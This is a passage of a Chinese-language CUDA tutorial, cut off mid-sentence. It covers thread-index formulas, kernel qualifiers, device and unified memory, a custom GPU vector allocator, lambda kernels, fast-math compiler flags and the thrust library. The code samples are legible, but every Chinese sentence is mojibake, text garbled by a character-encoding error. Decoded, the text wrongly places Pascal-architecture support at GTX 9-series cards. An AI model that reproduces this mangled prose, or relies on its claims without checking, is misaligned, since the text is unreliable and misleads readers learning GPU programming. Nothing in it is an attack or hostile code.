è¿™ç§è¯­æ³•ã€‚&lt;&lt;&lt;blockæ•°é‡ï¼Œæ¯ä¸ªæ¿å—ä¸­çš„çº¿ç¨‹æ•°é‡&gt;&gt;&gt;çš„å½¢å¼ï¼Œä¹Ÿå°±æ˜¯&lt;&lt;&lt;gridDim, blockDim&gt;&gt;&gt;ã€‚æ€»çš„æ¿å—æ•°é‡ç”±gridDimè¡¨ç¤ºã€‚ çº¿ç¨‹(thread)ï¼šå¹¶è¡Œçš„æœ€å°å•ä½ æ¿å—(block)ï¼šåŒ…å«è‹¥å¹²ä¸ªçº¿ç¨‹ ç½‘æ ¼(grid)ï¼šæŒ‡æ•´ä¸ªä»»åŠ¡ï¼ŒåŒ…å«è‹¥å¹²ä¸ªæ¿å— çº¿ç¨‹ï¼œæ¿å—ï¼œç½‘æ ¼ GPU çš„æ¿å—ç›¸å½“äº CPU çš„çº¿ç¨‹ï¼ŒGPU çš„çº¿ç¨‹ç›¸å½“äº CPU çš„SIMDï¼Œå¯ä»¥è¿™æ ·ç†è§£ï¼Œä½†ä¸å®Œå…¨ç­‰åŒã€‚ CUDA ä¹Ÿæ”¯æŒä¸‰ç»´çš„æ¿å—å’Œçº¿ç¨‹åŒºé—´ã€‚åªè¦åœ¨ä¸‰é‡å°–æ‹¬å·å†…æŒ‡å®šçš„å‚æ•°æ”¹æˆ dim3 ç±»å‹å³å¯ã€‚ 12345678910111213141516#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;__global__ void kernel() &#123; printf(\"Block (%d,%d,%d) of (%d,%d,%d), Thread (%d,%d,%d) of (%d,%d,%d)\\n\", blockIdx.x, blockIdx.y, blockIdx.z, gridDim.x, gridDim.y, gridDim.z, threadIdx.x, threadIdx.y, threadIdx.z, blockDim.x, blockDim.y, blockDim.z);&#125;int main() &#123; kernel&lt;&lt;&lt;dim3(2, 1, 1), dim3(2, 2, 2)&gt;&gt;&gt;(); cudaDeviceSynchronize(); return 0;&#125; äºŒç»´çš„è¯ï¼Œåªéœ€è¦æŠŠ dim3 æœ€åä¸€ä½ï¼ˆzæ–¹å‘ï¼‰çš„å€¼è®¾ä¸º 1 å³å¯ã€‚ çº¿ç¨‹ç´¢å¼• CUDAç¡¬ä»¶ç¯å¢ƒéƒ¨åˆ†ï¼Œä»‹ç»äº†ç¡¬ä»¶åœ¨è½¯ä»¶ä¸­çš„ç»„ç»‡å½¢å¼ï¼Œæ‰€ä»¥å¯ä»¥è®¡ç®—ï¼š 1ã€ grid 1ç»´ï¼Œblock 1ç»´ï¼ˆblockDim è¡¨ç¤ºæ¯ä¸€ç»´çš„size, blockIdxè¡¨ç¤ºåœ¨gridä¸­çš„ä½ç½®ï¼ŒthreadIdxè¡¨ç¤ºåœ¨blockä¸­çš„ä½ç½®ï¼‰ 1int threadId = blockIdx.x * blockDim.x + threadIdx.x; 2ã€ grid 1ç»´ï¼Œblock 2ç»´ 1int threadId = blockIdx.x * blockDim.x * blockDim.y + threadIdx.y * blockDim.x + threadIdx.x; 3ã€ grid 1ç»´ï¼Œblock 3ç»´ 1234int threadId = blockIdx.x * blockDim.x * blockDim.y * blockDim.z \\ + threadIdx.z * blockDim.y * blockDim.x \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 4ã€ grid 2ç»´ï¼Œblock 1ç»´ 12int blockId = blockIdx.x + blockIdx.y * gridDim.x; int threadId = blockId * blockDim.x + threadIdx.x; 5ã€ grid 2ç»´ï¼Œblock 2ç»´ 1234int blockId = blockIdx.x + blockIdx.y * gridDim.x; int threadId = blockId * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 6ã€ grid 2ç»´ï¼Œblock 3ç»´ 12345int blockId = blockIdx.x + blockIdx.y * gridDim.x; int threadId = blockId * blockDim.x * blockDim.y * blockDim.z \\ + threadIdx.z * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 7ã€ grid 3ç»´ï¼Œblock 1ç»´ 1234int blockId = blockIdx.x \\ + blockIdx.y * gridDim.x \\ + blockIdx.z * gridDim.x * gridDim.y; int threadId = blockId * blockDim.x + threadIdx.x; 8ã€ grid 3ç»´ï¼Œblock 2ç»´ 123456int blockId = blockIdx.x \\ + blockIdx.y * gridDim.x \\ + blockIdx.z * gridDim.x * gridDim.y; int threadId = blockId * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; 9ã€ grid 3ç»´ï¼Œblock 3ç»´ 1234567int blockId = blockIdx.x \\ + blockIdx.y * gridDim.x \\ + blockIdx.z * gridDim.x * gridDim.y; int threadId = blockId * blockDim.x * blockDim.y * blockDim.z \\ + threadIdx.z * blockDim.x * blockDim.y \\ + threadIdx.y * blockDim.x \\ + threadIdx.x; CUDAç¼–ç¨‹ CUDA çš„è¯­æ³•ï¼ŒåŸºæœ¬å®Œå…¨å…¼å®¹ C++ã€‚åŒ…æ‹¬ C++17 æ–°ç‰¹æ€§ï¼Œéƒ½å¯ä»¥ç”¨ã€‚ç”šè‡³å¯ä»¥æŠŠä»»ä½•ä¸€ä¸ª C++ é¡¹ç›®çš„æ–‡ä»¶åç¼€åå…¨éƒ¨æ”¹æˆ .cuï¼Œéƒ½èƒ½ç¼–è¯‘å‡ºæ¥ã€‚ CUDA å’Œ C++ çš„å…³ç³»å°±åƒ C++ å’Œ C çš„å…³ç³»ä¸€æ ·ï¼Œå¤§éƒ¨åˆ†éƒ½å…¼å®¹ï¼Œå› æ­¤èƒ½å¾ˆæ–¹ä¾¿åœ°é‡ç”¨ C++ ç°æœ‰çš„ä»»ä½•ä»£ç åº“ï¼Œå¼•ç”¨ C++ å¤´æ–‡ä»¶ç­‰ã€‚ ä»£ç æ‰§è¡Œ __global__ å®šä¹‰å‡½æ•° kernelï¼ˆä» CPU ç«¯é€šè¿‡ä¸‰é‡å°–æ‹¬å·è¯­æ³•è°ƒç”¨ï¼‰ï¼Œå‰é¢åŠ ä¸Š __global__ ä¿®é¥°ç¬¦ï¼Œå³å¯è®©ä»–åœ¨ GPU ä¸Šæ‰§è¡Œã€‚ä¸å¯ä»¥æœ‰è¿”å›å€¼ã€‚ GPU å’Œ CPU ä¹‹é—´çš„é€šä¿¡ï¼Œä¸ºäº†é«˜æ•ˆï¼Œæ˜¯å¼‚æ­¥çš„ã€‚CPUå®é™…ä¸Šåªæ˜¯æŠŠ kernel è¿™ä¸ªä»»åŠ¡æ¨é€åˆ° GPU çš„æ‰§è¡Œé˜Ÿåˆ—ä¸Šï¼Œç„¶åç«‹å³è¿”å›ï¼Œå¹¶ä¸ä¼šç­‰å¾…GPUæ‰§è¡Œå®Œæ¯•ã€‚ å¯ä»¥è°ƒç”¨ cudaDeviceSynchronize()ï¼Œè®© CPU é™·å…¥ç­‰å¾…ï¼Œç­‰ GPU å®Œæˆé˜Ÿåˆ—çš„æ‰€æœ‰ä»»åŠ¡åå†è¿”å›ã€‚ æ ¸å‡½æ•°è°ƒç”¨æ ¸å‡½æ•° ä» Kelper æ¶æ„å¼€å§‹ï¼Œ__global é‡Œå¯ä»¥è°ƒç”¨å¦ä¸€ä¸ª __globalï¼Œä¹Ÿå°±æ˜¯è¯´æ ¸å‡½æ•°å¯ä»¥è°ƒç”¨å¦ä¸€ä¸ªæ ¸å‡½æ•°ï¼Œä¸”å…¶ä¸‰é‡å°–æ‹¬å·é‡Œçš„æ¿å—æ•°å’Œçº¿ç¨‹æ•°å¯ä»¥åŠ¨æ€æŒ‡å®šã€‚ 12345678910111213141516171819#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;__global__ void another() &#123; printf(\"another: Thread %d of %d\\n\", threadIdx.x, blockDim.x);&#125;__global__ void kernel() &#123; printf(\"kernel: Thread %d of %d\\n\", threadIdx.x, blockDim.x); int numthreads = threadIdx.x * threadIdx.x + 1; another&lt;&lt;&lt;1, numthreads&gt;&gt;&gt;(); printf(\"kernel: called another with %d threads\\n\", numthreads);&#125;int main() &#123; kernel&lt;&lt;&lt;1, 3&gt;&gt;&gt;(); cudaDeviceSynchronize(); return 0;&#125; __device__ __device__ åˆ™ç”¨äºå®šä¹‰è®¾å¤‡å‡½æ•°ï¼Œä»–åœ¨ GPU ä¸Šæ‰§è¡Œï¼Œä½†æ˜¯ä» GPU ä¸Šè°ƒç”¨çš„ï¼Œè€Œä¸”ä¸éœ€è¦ä¸‰é‡å°–æ‹¬å·ï¼Œå’Œæ™®é€šå‡½æ•°ç”¨èµ·æ¥ä¸€æ ·ï¼Œå¯ä»¥æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼ã€‚ é»˜è®¤æƒ…å†µä¸‹ GPU å‡½æ•°å¿…é¡»å®šä¹‰åœ¨åŒä¸€ä¸ªæ–‡ä»¶é‡Œã€‚å¦‚æœä½ è¯•å›¾åˆ†ç¦»å£°æ˜å’Œå®šä¹‰ï¼Œè°ƒç”¨å¦ä¸€ä¸ªæ–‡ä»¶é‡Œçš„ __device æˆ– __global å‡½æ•°ï¼Œå°±ä¼šå‡ºé”™ã€‚ å»ºè®®æŠŠè¦ç›¸äº’è°ƒç”¨çš„ __device__ å‡½æ•°æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™æ ·æ–¹ä¾¿ç¼–è¯‘å™¨è‡ªåŠ¨å†…è”ä¼˜åŒ–ã€‚ __host åˆ™ç›¸åï¼Œå°†å‡½æ•°å®šä¹‰åœ¨ CPU ä¸Šã€‚ä»»ä½•å‡½æ•°å¦‚æœæ²¡æœ‰æŒ‡æ˜ä¿®é¥°ç¬¦ï¼Œåˆ™é»˜è®¤å°±æ˜¯ __hostã€‚ é€šè¿‡ __host __device è¿™æ ·çš„åŒé‡ä¿®é¥°ç¬¦ï¼Œå¯ä»¥æŠŠå‡½æ•°åŒæ—¶å®šä¹‰åœ¨ CPU å’Œ GPU ä¸Šã€‚ æ€»ç»“ host å¯ä»¥è°ƒç”¨ globalï¼›global å¯ä»¥è°ƒç”¨ deviceï¼›device å¯ä»¥è°ƒç”¨ deviceã€‚ CUDAå†…è” inline åœ¨ç°ä»£ C++ ä¸­çš„æ•ˆæœæ˜¯å£°æ˜ä¸€ä¸ªå‡½æ•°ä¸º weak ç¬¦å·ï¼Œå’Œæ€§èƒ½ä¼˜åŒ–æ„ä¹‰ä¸Šçš„å†…è”æ— å…³ã€‚ ä¼˜åŒ–æ„ä¹‰ä¸Šçš„å†…è”æŒ‡æŠŠå‡½æ•°ä½“ç›´æ¥æ”¾åˆ°è°ƒç”¨è€…é‚£é‡Œå»ã€‚CUDA ç¼–è¯‘å™¨æä¾›äº†__inline__ æ¥å£°æ˜ä¸€ä¸ªå‡½æ•°ä¸ºå†…è”ã€‚ä¸è®ºæ˜¯ CPU å‡½æ•°è¿˜æ˜¯ GPU éƒ½å¯ä»¥ä½¿ç”¨ï¼Œåªè¦ä½ ç”¨çš„ CUDA ç¼–è¯‘å™¨ã€‚ __inline__ ä¸ä¸€å®šå°±ä¿è¯å†…è”äº†ï¼Œå¦‚æœå‡½æ•°å¤ªå¤§ç¼–è¯‘å™¨å¯èƒ½ä¼šæ”¾å¼ƒå†…è”åŒ–ã€‚ å› æ­¤ CUDA è¿˜æä¾› __forceinline è¿™ä¸ªå…³é”®å­—æ¥å¼ºåˆ¶ä¸€ä¸ªå‡½æ•°ä¸ºå†…è”ã€‚GCC ä¹Ÿæœ‰ç›¸åº”çš„ __attribute((â€œalways_inlineâ€))ã€‚ è¿˜æœ‰ __noinline__ æ¥ç¦æ­¢å†…è”ä¼˜åŒ–ã€‚ constexpr å‡½æ•° æŒ‡å®š --expt-relaxed-constexpr è¿™ä¸ªç¼–è¯‘é€‰é¡¹ï¼ŒæŠŠ constexpr å‡½æ•°è‡ªåŠ¨å˜æˆä¿®é¥° __host __deviceã€‚å› ä¸º constexpr é€šå¸¸éƒ½æ˜¯ä¸€äº›å¯ä»¥å†…è”çš„å‡½æ•°ï¼Œæ•°å­¦è®¡ç®—è¡¨è¾¾å¼ä¹‹ç±»çš„ã€‚ å½“ç„¶ï¼Œconstexpr é‡Œæ²¡åŠæ³•è°ƒç”¨ printfï¼Œä¹Ÿä¸èƒ½ç”¨ __syncthreads ä¹‹ç±»çš„ GPU ç‰¹æœ‰çš„å‡½æ•°ï¼Œå› æ­¤ä¹Ÿä¸èƒ½å®Œå…¨æ›¿ä»£ __host å’Œ __deviceã€‚ å†…å­˜ç®¡ç† ä»æ ¸å‡½æ•°é‡Œè¿”å›æ•°æ® GPU ä½¿ç”¨ç‹¬ç«‹çš„æ˜¾å­˜ï¼Œä¸èƒ½è®¿é—® CPU å†…å­˜ã€‚CPU çš„å†…å­˜ç§°ä¸ºä¸»æœºå†…å­˜(host)ã€‚GPU ä½¿ç”¨çš„å†…å­˜ç§°ä¸ºè®¾å¤‡å†…å­˜(device)ï¼Œä»–æ˜¯æ˜¾å¡ä¸Šæ¿è½½çš„ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œåˆç§°æ˜¾å­˜ã€‚ ç”¨ cudaMalloc åˆ†é… GPU ä¸Šçš„æ˜¾å­˜ï¼Œè¿™æ ·å°±ä¸å‡ºé”™äº†ï¼Œç»“æŸæ—¶ cudaFree é‡Šæ”¾ã€‚cudaMalloc çš„è¿”å›å€¼å·²ç»ç”¨æ¥è¡¨ç¤ºé”™è¯¯ä»£ç ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡ &amp;pret äºŒçº§æŒ‡é’ˆè¿”å›ç»“æœã€‚ 1234567891011121314151617#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"__global__ void kernel(int *pret) &#123; *pret = 42;&#125;int main() &#123; int *pret; checkCudaErrors(cudaMalloc(&amp;pret, sizeof(int))); kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;(pret); checkCudaErrors(cudaDeviceSynchronize()); printf(\"result: %d\\n\", *pret); cudaFree(pret); return 0;&#125; helper_cuda.h åœ¨ /opt/cuda/samples/common/inc/helper_cuda.h ï¼Œå¯ä»¥ç›´æ¥å°†å…¶å’Œ helper_string.h ä¸€èµ·æ‹·è´åˆ°æŒ‡å®šçš„ include æ–‡ä»¶å¤¹ä¸‹ï¼Œä½¿ç”¨ä¸€äº›å°è£…å¥½çš„åŠŸèƒ½ã€‚ è¿™é‡Œæ¯”å¦‚ä¿å­˜åœ¨ .cu æ–‡ä»¶çš„åŒçº§ç›®å½•ä¸‹includeæ–‡ä»¶å¤¹ä¸‹ï¼Œæ›´æ”¹CMakeæ–‡ä»¶ï¼š 1target_include_directories(main PUBLIC ./include) ä½¿ç”¨ checkCudaErrors å®å¯è‡ªåŠ¨å¸®ä½ æ£€æŸ¥é”™è¯¯ä»£ç å¹¶æ‰“å°åœ¨ç»ˆç«¯ï¼Œç„¶åé€€å‡ºã€‚è¿˜ä¼šæŠ¥å‘Šå‡ºé”™æ‰€åœ¨çš„è¡Œå·ï¼Œå‡½æ•°åç­‰ã€‚ ä½¿ç”¨nvccç¼–è¯‘ï¼Œå°±æ·»åŠ  --include-path ç¼–è¯‘é€‰é¡¹ã€‚ è·¨ GPU/CPU åœ°å€ç©ºé—´æ‹·è´æ•°æ® cudaMemcpyï¼Œä»–èƒ½å¤Ÿåœ¨ GPU å’Œ CPU å†…å­˜ä¹‹é—´æ‹·è´æ•°æ®ã€‚ cudaMemcpy ä¼šè‡ªåŠ¨è¿›è¡ŒåŒæ­¥æ“ä½œï¼Œå³ä¼šè°ƒç”¨ cudaDeviceSynchronize() ï¼ 1234567891011121314151617181920#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"__global__ void kernel(int *pret) &#123; *pret = 42;&#125;int main() &#123; int *pret; checkCudaErrors(cudaMalloc(&amp;pret, sizeof(int))); kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;(pret); int ret; checkCudaErrors(cudaMemcpy(&amp;ret, pret, sizeof(int), cudaMemcpyDeviceToHost)); printf(\"result: %d\\n\", ret); cudaFree(pret); return 0;&#125; ç»Ÿä¸€å†…å­˜åœ°å€æŠ€æœ¯ï¼ˆUnified Memoryï¼‰ ä¸€ç§åœ¨æ¯”è¾ƒæ–°çš„æ˜¾å¡ä¸Šæ”¯æŒçš„ç‰¹æ€§ï¼Œé‚£å°±æ˜¯ç»Ÿä¸€å†…å­˜(managed)ï¼Œåªéœ€æŠŠ cudaMalloc æ¢æˆ cudaMallocManaged å³å¯ï¼Œé‡Šæ”¾æ—¶ä¹Ÿæ˜¯é€šè¿‡ cudaFreeã€‚ ä» Pascal æ¶æ„å¼€å§‹æ”¯æŒçš„ï¼Œä¹Ÿå°±æ˜¯ GTX9 å¼€å¤´åŠä»¥ä¸Šã€‚ è¿™æ ·åˆ†é…å‡ºæ¥çš„åœ°å€ï¼Œä¸è®ºåœ¨ CPU è¿˜æ˜¯ GPU ä¸Šéƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œéƒ½å¯ä»¥è®¿é—®ã€‚è€Œä¸”æ‹·è´ä¹Ÿä¼šè‡ªåŠ¨æŒ‰éœ€è¿›è¡Œï¼ˆå½“ä» CPU è®¿é—®æ—¶ï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨è°ƒç”¨ cudaMemcpyã€‚ è™½ç„¶æ–¹ä¾¿ï¼Œä½†å¹¶éå®Œå…¨æ²¡æœ‰å¼€é”€ï¼Œæ‰‹åŠ¨æ‹·è´å¯èƒ½é«˜æ•ˆä¸€äº›ã€‚ 1234567891011121314151617#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"__global__ void kernel(int *pret) &#123; *pret = 42;&#125;int main() &#123; int *pret; checkCudaErrors(cudaMallocManaged(&amp;pret, sizeof(int))); kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;(pret); checkCudaErrors(cudaDeviceSynchronize()); printf(\"result: %d\\n\", *pret); cudaFree(pret); return 0;&#125; æ€»ç»“ ä¸»æœºå†…å­˜(host)ï¼šmallocã€free è®¾å¤‡å†…å­˜(device)ï¼šcudaMallocã€cudaFree ç»Ÿä¸€å†…å­˜(managed)ï¼šcudaMallocManagedã€cudaFree C++å°è£… å®šåˆ¶CudaAllocatorï¼Œæ„å»ºåœ¨GPUä¸Šçš„vectorå¯¹è±¡ã€‚ æ³¨æ„ï¼Œvector åœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼ˆæˆ–æ˜¯ä¹‹å resize çš„æ—¶å€™ï¼‰ä¼šè°ƒç”¨æ‰€æœ‰å…ƒç´ çš„æ— å‚æ„é€ å‡½æ•°ï¼Œå¯¹ int ç±»å‹æ¥è¯´å°±æ˜¯é›¶åˆå§‹åŒ–ã€‚ç„¶è€Œè¿™ä¸ªåˆå§‹åŒ–ä¼šæ˜¯åœ¨ CPU ä¸Šåšçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¦ç”¨ä»–ã€‚ é€šè¿‡ç»™ allocator æ·»åŠ  construct æˆå‘˜å‡½æ•°ï¼Œæ¥é­”æ”¹ vector å¯¹å…ƒç´ çš„æ„é€ ã€‚ åªéœ€è¦åˆ¤æ–­æ˜¯ä¸æ˜¯æœ‰å‚æ•°ï¼Œç„¶åæ˜¯ä¸æ˜¯ä¼ ç»Ÿçš„ C è¯­è¨€ç±»å‹ï¼ˆplain-old-dataï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è·³è¿‡å…¶æ— å‚æ„é€ ï¼Œä»è€Œé¿å…åœ¨ CPU ä¸Šä½æ•ˆçš„é›¶åˆå§‹åŒ–ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"#include &lt;vector&gt;template &lt;class T&gt;struct CudaAllocator &#123; using value_type = T; T *allocate(size_t size) &#123; T *ptr = nullptr; checkCudaErrors(cudaMallocManaged(&amp;ptr, size * sizeof(T))); return ptr; &#125; void deallocate(T *ptr, size_t size = 0) &#123; checkCudaErrors(cudaFree(ptr)); &#125; template &lt;class ...Args&gt; void construct(T *p, Args &amp;&amp;...args) &#123; // åªéœ€è¦åˆ¤æ–­æ˜¯ä¸æ˜¯æœ‰å‚æ•°ï¼Œæ˜¯ä¸æ˜¯ä¼ ç»Ÿçš„ C è¯­è¨€ç±»å‹ï¼ˆplain-old-dataï¼‰ // å¦‚æœæ˜¯ï¼Œåˆ™è·³è¿‡å…¶æ— å‚æ„é€ ï¼Œä»è€Œé¿å…åœ¨ CPU ä¸Šä½æ•ˆçš„é›¶åˆå§‹åŒ– if constexpr (!(sizeof...(Args) == 0 &amp;&amp; std::is_pod_v&lt;T&gt;)) ::new((void *)p) T(std::forward&lt;Args&gt;(args)...); &#125;&#125;;template &lt;int N, class T&gt;__global__ void kernel(T *arr) &#123; for (int i = blockDim.x * blockIdx.x + threadIdx.x; i &lt; N; i += blockDim.x * gridDim.x) &#123; arr[i] = i; &#125;&#125;int main() &#123; constexpr int n = 65536; std::vector&lt;int, CudaAllocator&lt;int&gt;&gt; arr(n); kernel&lt;n&gt;&lt;&lt;&lt;32, 128&gt;&gt;&gt;(arr.data()); checkCudaErrors(cudaDeviceSynchronize()); for (int i = 0; i &lt; n; i++) &#123; printf(\"arr[%d]: %d\\n\", i, arr[i]); &#125; return 0;&#125; æ ¸å‡½æ•°å¯ä»¥æ˜¯ä¸€ä¸ªæ¨¡æ¿å‡½æ•° CUDA çš„ä¼˜åŠ¿åœ¨äºå¯¹ C++ çš„å®Œå…¨æ”¯æŒã€‚æ‰€ä»¥ __global__ ä¿®é¥°çš„æ ¸å‡½æ•°è‡ªç„¶ä¹Ÿæ˜¯å¯ä»¥ä¸ºæ¨¡æ¿å‡½æ•°çš„ã€‚ è°ƒç”¨æ¨¡æ¿æ—¶ä¸€æ ·å¯ä»¥ç”¨è‡ªåŠ¨å‚æ•°ç±»å‹æ¨å¯¼ï¼Œå¦‚æœ‰æ‰‹åŠ¨æŒ‡å®šçš„æ¨¡æ¿å‚æ•°ï¼ˆå•å°–æ‹¬å·ï¼‰è¯·æ”¾åœ¨ä¸‰é‡å°–æ‹¬å·çš„å‰é¢ã€‚ æ ¸å‡½æ•°å¯ä»¥æ¥å— functorï¼Œå®ç°å‡½æ•°å¼ç¼–ç¨‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"#include &lt;vector&gt;template &lt;class T&gt;struct CudaAllocator &#123; using value_type = T; T *allocate(size_t size) &#123; T *ptr = nullptr; checkCudaErrors(cudaMallocManaged(&amp;ptr, size * sizeof(T))); return ptr; &#125; void deallocate(T *ptr, size_t size = 0) &#123; checkCudaErrors(cudaFree(ptr)); &#125; template &lt;class ...Args&gt; void construct(T *p, Args &amp;&amp;...args) &#123; if constexpr (!(sizeof...(Args) == 0 &amp;&amp; std::is_pod_v&lt;T&gt;)) ::new((void *)p) T(std::forward&lt;Args&gt;(args)...); &#125;&#125;;template &lt;class Func&gt;__global__ void parallel_for(int n, Func func) &#123; for (int i = blockDim.x * blockIdx.x + threadIdx.x; i &lt; n; i += blockDim.x * gridDim.x) &#123; func(i); &#125;&#125;struct MyFunctor &#123; __device__ void operator()(int i) const &#123; printf(\"number %d\\n\", i); &#125;&#125;;int main() &#123; int n = 65536; parallel_for&lt;&lt;&lt;32, 128&gt;&gt;&gt;(n, MyFunctor&#123;&#125;); checkCudaErrors(cudaDeviceSynchronize()); return 0;&#125; æ³¨æ„ï¼š Func ä¸å¯ä»¥æ˜¯ Func const &amp;ï¼Œé‚£æ ·ä¼šå˜æˆä¸€ä¸ªæŒ‡å‘ CPU å†…å­˜åœ°å€çš„æŒ‡é’ˆï¼Œä»è€Œå‡ºé”™ã€‚æ‰€ä»¥ CPU å‘ GPU çš„ä¼ å‚å¿…é¡»æŒ‰å€¼ä¼ ã€‚ åšå‚æ•°çš„è¿™ä¸ªå‡½æ•°å¿…é¡»æ˜¯ä¸€ä¸ªæœ‰ç€æˆå‘˜å‡½æ•° operator() çš„ç±»å‹ï¼Œå³ functor ç±»ã€‚è€Œä¸èƒ½æ˜¯ç‹¬ç«‹çš„å‡½æ•°ã€‚ è¿™ä¸ªå‡½æ•°å¿…é¡»æ ‡è®°ä¸º __device__ï¼Œå³ GPU ä¸Šçš„å‡½æ•°ï¼Œå¦åˆ™ä¼šå˜æˆ CPU ä¸Šçš„å‡½æ•°ã€‚ functor å¯ä»¥æ˜¯ lambda è¡¨è¾¾å¼ã€‚ä¸è¿‡å¿…é¡»åœ¨ [] åï¼Œ() å‰ï¼Œæ’å…¥ __device__ ä¿®é¥°ç¬¦ã€‚è€Œä¸”éœ€è¦å¼€å¯ --extended-lambda ç¼–è¯‘é€‰é¡¹ã€‚åœ¨ CMake ä¸­è¡¨ç¤ºä¸ºï¼š 1target_compile_options(main PUBLIC $&lt;$&lt;COMPILE_LANGUAGE:CUDA&gt;:--extended-lambda&gt;) è¿™é‡Œä½¿ç”¨äº† CMake çš„ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼Œé™åˆ¶ flag åªå¯¹ CUDA æºç ç”Ÿæ•ˆã€‚ æ•è·å¤–éƒ¨å˜é‡ å°† GPU ä¸Šçš„å†…å­˜åœ°å€æµ…æ‹·è´åˆ° lambda ä¸­ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;cstdio&gt;#include &lt;cuda_runtime.h&gt;#include \"helper_cuda.h\"#include &lt;vector&gt;template &lt;class T&gt;struct CudaAllocator &#123; using value_type = T; T *allocate(size_t size) &#123; T *ptr = nullptr; checkCudaErrors(cudaMallocManaged(&amp;ptr, size * sizeof(T))); return ptr; &#125; void deallocate(T *ptr, size_t size = 0) &#123; checkCudaErrors(cudaFree(ptr)); &#125; template &lt;class ...Args&gt; void construct(T *p, Args &amp;&amp;...args) &#123; if constexpr (!(sizeof...(Args) == 0 &amp;&amp; std::is_pod_v&lt;T&gt;)) ::new((void *)p) T(std::forward&lt;Args&gt;(args)...); &#125;&#125;;template &lt;class Func&gt;__global__ void parallel_for(int n, Func func) &#123; for (int i = blockDim.x * blockIdx.x + threadIdx.x; i &lt; n; i += blockDim.x * gridDim.x) &#123; func(i); &#125;&#125;int main() &#123; int n = 65536; std::vector&lt;int, CudaAllocator&lt;int&gt;&gt; arr(n); // æ‹·è´æŒ‡é’ˆ int *arr_data = arr.data(); parallel_for&lt;&lt;&lt;32, 128&gt;&gt;&gt;(n, [=] __device__ (int i) &#123; arr_data[i] = i; &#125;); checkCudaErrors(cudaDeviceSynchronize()); for (int i = 0; i &lt; n; i++) &#123; printf(\"arr[%d] = %d\\n\", i, arr[i]); &#125; return 0;&#125; ä¸èƒ½ [=] ä¼ arrï¼Œå› ä¸ºvector é»˜è®¤æ·±æ‹·è´ã€‚æˆ–è€… [&amp;] ä¼ arrï¼Œå› ä¸ºarræ˜¯ä¸ªCPUä¸Šçš„å¯¹è±¡ï¼Œä¸æ˜¯GPUä¸Šå®é™…å†…å­˜åœ°å€çš„æŒ‡é’ˆã€‚ æ•°å­¦è¿ç®— ä½¿ç”¨Cçš„å‡½æ•°è®¡ç®—ï¼Œé€šè¿‡GPUè¿›è¡ŒåŠ é€Ÿã€‚GPU æ¯” CPU å¿«äº†å¾ˆå¤šã€‚å¦å¤–GPUéœ€è¦é¢„çƒ­ï¼Œè‹¥æ‰§è¡Œå¤šæ¬¡å¾ªç¯ï¼Œé€Ÿåº¦ä¼šæ›´å¿«ï¼Œç›¸å·®100å€æ˜¯æ²¡é—®é¢˜çš„ã€‚ æ³¨æ„è®¡ç®— float ç±»å‹æ•°å€¼ï¼Œä½¿ç”¨å¯¹åº” float ç‰ˆæœ¬å‡½æ•°ï¼Œsinfã€cosfã€rsqrtfç­‰ã€‚ ä¸¤ä¸ªä¸‹åˆ’çº¿çš„æ˜¯ __sinf æ˜¯ GPU intrinsticsï¼Œé€‚åˆå¯¹ç²¾åº¦è¦æ±‚ä¸é«˜ï¼Œä½†æœ‰æ€§èƒ½è¦æ±‚çš„å›¾å½¢å­¦ä»»åŠ¡ã€‚ ç¼–è¯‘é€‰é¡¹ --ftz=true ä¼šæŠŠæå°æ•°(denormal)é€€åŒ–ä¸º0ã€‚ --prec-div=false é™ä½é™¤æ³•çš„ç²¾åº¦æ¢å–é€Ÿåº¦ã€‚ --prec-sqrt=false é™ä½å¼€æ–¹çš„ç²¾åº¦æ¢å–é€Ÿåº¦ã€‚ --fmad å› ä¸ºéå¸¸é‡è¦ï¼Œæ‰€ä»¥é»˜è®¤å°±æ˜¯å¼€å¯çš„ï¼Œä¼šè‡ªåŠ¨æŠŠ a * b + c ä¼˜åŒ–æˆä¹˜åŠ (FMA)æŒ‡ä»¤ã€‚ è‹¥å¼€å¯äº† --use_fast_math é€‰é¡¹ï¼Œé‚£ä¹ˆæ‰€æœ‰å¯¹ sinf çš„è°ƒç”¨éƒ½ä¼šè‡ªåŠ¨è¢«æ›¿æ¢æˆ __sinfã€‚åŒæ—¶è‡ªåŠ¨å¼€å¯ä¸Šè¿°æ‰€æœ‰ä¼˜åŒ–ã€‚ CUDA thrust åº“ thrust ç›¸å½“äºè®¾è®¡ç»™ GPU çš„STLã€‚åŒ…æ‹¬ä¸Šè¿°ä¸­ï¼ŒGPUä¸Šçš„vectorä¹Ÿä¸ç”¨æ‰‹åŠ¨å®ç°ï¼Œç›´æ¥ä½¿ç”¨ thrust å°±å¯ä»¥ã€‚ thrust::universal_vector ä¼šåœ¨ç»Ÿä¸€å†…å­˜ä¸Šåˆ†é…ï¼Œå› æ­¤ä¸è®º GPU 